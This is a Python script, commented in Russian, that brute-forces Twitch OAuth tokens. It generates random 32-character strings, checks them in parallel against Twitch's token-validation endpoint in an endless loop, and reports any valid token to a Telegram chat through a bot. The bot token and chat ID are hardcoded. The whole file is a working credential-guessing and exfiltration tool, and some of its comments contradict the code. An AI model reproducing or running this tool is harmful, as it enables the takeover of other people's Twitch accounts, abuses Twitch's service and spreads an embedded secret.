import random
import string
import requests
import telebot
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Конфигурация
TELEGRAM_TOKEN = '7343454082:AAEwgrgB8HerkLFpcU2odZK5d9hShKKvIiQ'
CHAT_ID = '6578018656'

bot = telebot.TeleBot(TELEGRAM_TOKEN)

def generate_token(length=32):
    """Генерирует случайный токен из букв и цифр"""
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def check_twitch_token(token):
    """Проверяет, действителен ли токен через запрос к Twitch API"""
    url = 'https://id.twitch.tv/oauth2/validate'
    headers = {
        'Authorization': f'OAuth {token}'
    }
    
    try:
        response = requests.get(url, headers=headers)
        return token, response.status_code == 200
    except requests.RequestException as e:
        print(f"Error checking token {token}: {e}")
        return token, False

def send_telegram_message(bot, chat_id, message):
    """Отправляет сообщение в Telegram"""
    bot.send_message(chat_id=chat_id, text=message)

def main():
    bot.send_message(chat_id=CHAT_ID, text="Бот работает")
    
    while True:
        # Генерируем токены
        tokens = [generate_token() for _ in range(150)]  # Генерируем 50 токенов
        print("Generated tokens:")
        for token in tokens:
            print(token)
        
        valid_tokens = []
        invalid_token = None
        
        # Проверяем токены
        print("\nChecking tokens:")
        with ThreadPoolExecutor(max_workers=150) as executor:
            future_to_token = {executor.submit(check_twitch_token, token): token for token in tokens}
            for future in as_completed(future_to_token):
                token, is_valid = future.result()
                if is_valid:
                    valid_tokens.append(token)
                else:
                    if invalid_token is None:
                        invalid_token = token  # Запоминаем первый невалидный токен

        # Отправляем валидные токены
        if valid_tokens:
            for token in valid_tokens:
                message = f"#Valid token found: {token}"
                print(message)
                send_telegram_message(bot, CHAT_ID, message)
        else:
            if invalid_token:
                message = f"#Invalid All tokens are #invalid. Example of an invalid token: {invalid_token}"
                print(message)
                send_telegram_message(bot, CHAT_ID, message)

        # Пауза перед следующей итерацией
        time.sleep(3)  # Задержка 10 секунд (можете настроить по своему усмотрению)

if __name__ == '__main__':
    main()
